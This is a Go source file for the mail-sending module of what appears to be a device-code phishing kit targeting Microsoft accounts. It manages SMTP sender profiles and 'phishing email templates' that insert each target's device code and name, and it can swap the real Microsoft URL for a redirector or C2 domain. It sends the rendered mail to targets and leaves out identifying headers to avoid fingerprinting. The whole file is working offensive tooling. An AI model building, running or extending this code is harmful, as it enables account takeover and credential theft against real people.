package mailer

import (
	"crypto/rand"
	"crypto/tls"
	"encoding/base64"
	"encoding/hex"
	"fmt"
	"log"
	"net/smtp"
	"strings"
	"sync"
	"time"
)

// SenderProfile holds SMTP credentials for an outbound mail account.
type SenderProfile struct {
	ID          string    `json:"id"`
	Name        string    `json:"name"`
	Host        string    `json:"host"`
	Port        int       `json:"port"`
	Username    string    `json:"username"`
	Password    string    `json:"password,omitempty"`
	FromAddress string    `json:"from_address"`
	FromName    string    `json:"from_name"`
	// ImplicitTLS uses direct TLS on connect (port 465 / SMTPS).
	// When false, smtp.SendMail negotiates STARTTLS automatically if offered.
	ImplicitTLS bool      `json:"implicit_tls"`
	// AuthMethod controls the SMTP AUTH mechanism. Accepted values:
	//   "plain" (default) — AUTH PLAIN
	//   "login"           — AUTH LOGIN (required by Exchange/Outlook)
	AuthMethod  string    `json:"auth_method,omitempty"`
	CreatedAt   time.Time `json:"created_at"`
}

// loginAuth implements smtp.Auth for the AUTH LOGIN mechanism
// required by Microsoft Exchange / Outlook SMTP servers.
type loginAuth struct {
	username, password string
}

func (a loginAuth) Start(_ *smtp.ServerInfo) (string, []byte, error) {
	return "LOGIN", nil, nil
}

func (a loginAuth) Next(fromServer []byte, more bool) ([]byte, error) {
	if !more {
		return nil, nil
	}
	challenge := strings.ToLower(strings.TrimSpace(string(fromServer)))
	decoded, err := base64.StdEncoding.DecodeString(challenge)
	if err == nil {
		challenge = strings.ToLower(strings.TrimSpace(string(decoded)))
	}
	switch {
	case strings.HasPrefix(challenge, "username"):
		return []byte(a.username), nil
	case strings.HasPrefix(challenge, "password"):
		return []byte(a.password), nil
	default:
		return nil, fmt.Errorf("unexpected AUTH LOGIN challenge: %q", fromServer)
	}
}

// EmailTemplate is a reusable phishing email template.
//
// Supported placeholders:
//
//	{{DCODE}}   — target's unique user code (e.g. ABCD-EFGH)
//	{{URL}}     — redirector URL if set, otherwise the real verification URI
//	{{REALURL}} — always the real Microsoft verification URI
//	{{EMAIL}}   — target email address
//	{{NAME}}    — target display name
//
// RedirectorURL: if non-empty, {{URL}} resolves to this value instead of the
// real Microsoft URL. Use this to front requests through a redirector/C2 domain.
type EmailTemplate struct {
	ID            string    `json:"id"`
	Name          string    `json:"name"`
	Subject       string    `json:"subject"`
	HTMLBody      string    `json:"html_body"`
	TextBody      string    `json:"text_body,omitempty"`
	RedirectorURL string    `json:"redirector_url,omitempty"`
	CreatedAt     time.Time `json:"created_at"`
}

// TemplateData holds per-target rendering context.
type TemplateData struct {
	UserCode    string // {{DCODE}}
	RealURL     string // {{REALURL}} — always the Microsoft verification URI
	TargetEmail string // {{EMAIL}}
	TargetName  string // {{NAME}}
}

// EmailSendResult records the outcome of one send attempt.
type EmailSendResult struct {
	TargetID    string    `json:"target_id"`
	TargetEmail string    `json:"target_email"`
	SentAt      time.Time `json:"sent_at"`
	Error       string    `json:"error,omitempty"`
	Success     bool      `json:"success"`
}

// ProfileStore is the minimal interface that Manager needs for profile persistence.
type ProfileStore interface {
	UpsertSenderProfile(p interface{ toStoreRow() interface{} }) error
}

// Manager holds sender profiles and email templates in memory.
type Manager struct {
	mu        sync.RWMutex
	profiles  map[string]*SenderProfile
	templates map[string]*EmailTemplate

	// db callbacks — set by wire-up in main; nil means no persistence (tests).
	saveProfileFn   func(*SenderProfile)
	deleteProfileFn func(id string)
	saveTemplateFn  func(*EmailTemplate)
	deleteTemplateFn func(id string)
}

func NewManager() *Manager {
	return &Manager{
		profiles:  make(map[string]*SenderProfile),
		templates: make(map[string]*EmailTemplate),
	}
}

// SetPersistence wires the store callbacks into the manager.
func (m *Manager) SetPersistence(
	saveProfile func(*SenderProfile),
	deleteProfile func(id string),
	saveTemplate func(*EmailTemplate),
	deleteTemplate func(id string),
) {
	m.saveProfileFn = saveProfile
	m.deleteProfileFn = deleteProfile
	m.saveTemplateFn = saveTemplate
	m.deleteTemplateFn = deleteTemplate
}

// --- Profiles ---

func (m *Manager) SaveProfile(p *SenderProfile) {
	m.mu.Lock()
	m.profiles[p.ID] = p
	m.mu.Unlock()
	if m.saveProfileFn != nil {
		m.saveProfileFn(p)
	}
}

func (m *Manager) GetProfile(id string) (*SenderProfile, bool) {
	m.mu.RLock()
	defer m.mu.RUnlock()
	p, ok := m.profiles[id]
	return p, ok
}

func (m *Manager) AllProfiles() []*SenderProfile {
	m.mu.RLock()
	defer m.mu.RUnlock()
	out := make([]*SenderProfile, 0, len(m.profiles))
	for _, p := range m.profiles {
		out = append(out, p)
	}
	return out
}

func (m *Manager) DeleteProfile(id string) {
	m.mu.Lock()
	delete(m.profiles, id)
	m.mu.Unlock()
	if m.deleteProfileFn != nil {
		m.deleteProfileFn(id)
	}
}

// --- Templates ---

func (m *Manager) SaveTemplate(t *EmailTemplate) {
	m.mu.Lock()
	m.templates[t.ID] = t
	m.mu.Unlock()
	if m.saveTemplateFn != nil {
		m.saveTemplateFn(t)
	}
}

func (m *Manager) GetTemplate(id string) (*EmailTemplate, bool) {
	m.mu.RLock()
	defer m.mu.RUnlock()
	t, ok := m.templates[id]
	return t, ok
}

func (m *Manager) AllTemplates() []*EmailTemplate {
	m.mu.RLock()
	defer m.mu.RUnlock()
	out := make([]*EmailTemplate, 0, len(m.templates))
	for _, t := range m.templates {
		out = append(out, t)
	}
	return out
}

func (m *Manager) DeleteTemplate(id string) {
	m.mu.Lock()
	delete(m.templates, id)
	m.mu.Unlock()
	if m.deleteTemplateFn != nil {
		m.deleteTemplateFn(id)
	}
}

// --- Rendering ---

// Render replaces placeholder tokens in s with values from data.
// {{URL}} resolves to tmpl.RedirectorURL if set, otherwise data.RealURL.
func Render(s string, tmpl *EmailTemplate, data TemplateData) string {
	effectiveURL := data.RealURL
	if tmpl.RedirectorURL != "" {
		effectiveURL = tmpl.RedirectorURL
	}
	r := strings.NewReplacer(
		"{{DCODE}}", data.UserCode,
		"{{URL}}", effectiveURL,
		"{{REALURL}}", data.RealURL,
		"{{EMAIL}}", data.TargetEmail,
		"{{NAME}}", data.TargetName,
	)
	return r.Replace(s)
}

// --- Sending ---

// Send delivers one phishing email to data.TargetEmail.
func Send(profile *SenderProfile, tmpl *EmailTemplate, data TemplateData) error {
	subject := Render(tmpl.Subject, tmpl, data)
	htmlBody := Render(tmpl.HTMLBody, tmpl, data)
	textBody := Render(tmpl.TextBody, tmpl, data)

	msg, err := buildMIME(profile, data.TargetEmail, subject, htmlBody, textBody)
	if err != nil {
		return fmt.Errorf("building MIME message: %w", err)
	}

	var auth smtp.Auth
	if profile.Username != "" {
		if strings.ToLower(profile.AuthMethod) == "login" || isExchangeHost(profile.Host) {
			auth = loginAuth{profile.Username, profile.Password}
		} else {
			auth = smtp.PlainAuth("", profile.Username, profile.Password, profile.Host)
		}
	}

	addr := fmt.Sprintf("%s:%d", profile.Host, profile.Port)

	if profile.ImplicitTLS {
		return sendImplicitTLS(addr, profile.Host, auth, profile.FromAddress, data.TargetEmail, msg)
	}
	return smtp.SendMail(addr, auth, profile.FromAddress, []string{data.TargetEmail}, msg)
}

func sendImplicitTLS(addr, host string, auth smtp.Auth, from, to string, msg []byte) error {
	conn, err := tls.Dial("tcp", addr, &tls.Config{ServerName: host})
	if err != nil {
		return fmt.Errorf("TLS dial: %w", err)
	}
	c, err := smtp.NewClient(conn, host)
	if err != nil {
		return fmt.Errorf("SMTP client: %w", err)
	}
	defer c.Close()

	if auth != nil {
		if err := c.Auth(auth); err != nil {
			return fmt.Errorf("SMTP auth: %w", err)
		}
	}
	if err := c.Mail(from); err != nil {
		return fmt.Errorf("SMTP MAIL FROM: %w", err)
	}
	if err := c.Rcpt(to); err != nil {
		return fmt.Errorf("SMTP RCPT TO: %w", err)
	}
	w, err := c.Data()
	if err != nil {
		return fmt.Errorf("SMTP DATA: %w", err)
	}
	if _, err := w.Write(msg); err != nil {
		return fmt.Errorf("writing message body: %w", err)
	}
	return w.Close()
}

// buildMIME constructs a properly-headed RFC 5322 MIME message.
// Headers included: Date, Message-ID, From, To, Subject, MIME-Version.
// No X-Mailer or X-Originating-IP headers are added.
func buildMIME(profile *SenderProfile, to, subject, htmlBody, textBody string) ([]byte, error) {
	msgID, err := randomMessageID(profile.FromAddress)
	if err != nil {
		return nil, err
	}
	boundary, err := randomBoundary()
	if err != nil {
		return nil, err
	}

	from := fmt.Sprintf("%s <%s>", profile.FromName, profile.FromAddress)

	var b strings.Builder
	// RFC 5322 date format
	b.WriteString("Date: " + time.Now().Format("Mon, 02 Jan 2006 15:04:05 -0700") + "\r\n")
	b.WriteString("Message-ID: " + msgID + "\r\n")
	b.WriteString("From: " + from + "\r\n")
	b.WriteString("To: " + to + "\r\n")
	b.WriteString("Subject: " + subject + "\r\n")
	b.WriteString("MIME-Version: 1.0\r\n")

	if textBody != "" {
		b.WriteString(`Content-Type: multipart/alternative; boundary="` + boundary + `"` + "\r\n\r\n")
		b.WriteString("--" + boundary + "\r\n")
		b.WriteString("Content-Type: text/plain; charset=UTF-8\r\n")
		b.WriteString("Content-Transfer-Encoding: 7bit\r\n\r\n")
		b.WriteString(textBody + "\r\n")
		b.WriteString("--" + boundary + "\r\n")
		b.WriteString("Content-Type: text/html; charset=UTF-8\r\n")
		b.WriteString("Content-Transfer-Encoding: 7bit\r\n\r\n")
		b.WriteString(htmlBody + "\r\n")
		b.WriteString("--" + boundary + "--\r\n")
	} else {
		b.WriteString("Content-Type: text/html; charset=UTF-8\r\n")
		b.WriteString("Content-Transfer-Encoding: 7bit\r\n\r\n")
		b.WriteString(htmlBody)
	}

	return []byte(b.String()), nil
}

// randomMessageID generates a unique RFC 5322 Message-ID using the sender domain.
func randomMessageID(fromAddress string) (string, error) {
	buf := make([]byte, 16)
	if _, err := rand.Read(buf); err != nil {
		return "", err
	}
	local := hex.EncodeToString(buf)

	domain := "localhost"
	if idx := strings.LastIndex(fromAddress, "@"); idx != -1 {
		domain = fromAddress[idx+1:]
	}
	return fmt.Sprintf("<%s@%s>", local, domain), nil
}

// randomBoundary generates a cryptographically random MIME boundary.
// A static boundary is a fingerprint; randomising it per message avoids that.
func randomBoundary() (string, error) {
	buf := make([]byte, 12)
	if _, err := rand.Read(buf); err != nil {
		return "", err
	}
	return "----=_Part_" + hex.EncodeToString(buf), nil
}

// isExchangeHost returns true for Microsoft Exchange / Office 365 SMTP hosts
// that require AUTH LOGIN instead of AUTH PLAIN.
func isExchangeHost(host string) bool {
	h := strings.ToLower(host)
	return strings.HasSuffix(h, ".outlook.com") ||
		strings.HasSuffix(h, ".office365.com") ||
		strings.HasSuffix(h, ".exchange.microsoft.com")
}

// loadProfilesFromRows populates the manager from database rows at startup.
func (m *Manager) LoadProfiles(profiles []SenderProfile) {
	m.mu.Lock()
	defer m.mu.Unlock()
	for i := range profiles {
		p := profiles[i]
		m.profiles[p.ID] = &p
	}
	log.Printf("[store] loaded %d sender profiles from database", len(profiles))
}

// LoadTemplates populates the manager from database rows at startup.
func (m *Manager) LoadTemplates(templates []EmailTemplate) {
	m.mu.Lock()
	defer m.mu.Unlock()
	for i := range templates {
		t := templates[i]
		m.templates[t.ID] = &t
	}
	log.Printf("[store] loaded %d email templates from database", len(templates))
}
